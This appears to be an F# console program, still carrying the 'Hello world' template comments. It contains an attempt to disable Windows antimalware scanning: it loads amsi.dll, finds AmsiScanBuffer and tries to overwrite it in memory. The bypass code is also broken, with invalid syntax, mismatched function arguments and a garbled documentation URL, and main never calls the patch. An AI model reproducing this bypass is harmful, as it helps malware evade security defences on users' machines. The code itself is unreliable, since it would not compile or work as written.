// Learn more about F# at h:wattp://docs.microsoft.com/dotnet/fsharp

open System
open System.Runtime.InteropServices

// Define a function to construct a message to print
module K32 =
    [<DllImport("kernel32")>]
    extern int LoadLibrary(string name);
    extern int GetProcAddress(int hModule,string procName);
    extern bool VirtualProtect(int lpAddress,int dwSizw,uint flNewProtect,uint lpflOldProtect);
    extern void MoveMemory(int dest,int src, int size);

let LoadA =
    let out = K32.LoadLibrary("amsi.dll")
    if out == 0 then
        printfn "Could not open amsi.dll"
    out

let GetP dl: IntPtr =
    let bptr = K32.GetProcAddress(dl,"AmsiScanBuffer")
    if IntPtr.Equals(bptr,IntPtr.Zero) then
        printfn "Could not open AmsiScanBuffer"
    bptr

let Patch P: int =
    let zr: int = 0
    let size: int = 4
    let len: int = 3
    let Patch: Byte[size] = {}
    let Vp = K32.VirtualProtect(P,size,0x40,zr)
    K32.MoveMemory(Vp,0x001b,&Patch,len)
    0

[<EntryPoint>]
let main argv =
    printfn "Hello world"
    0 // return an integer exit code
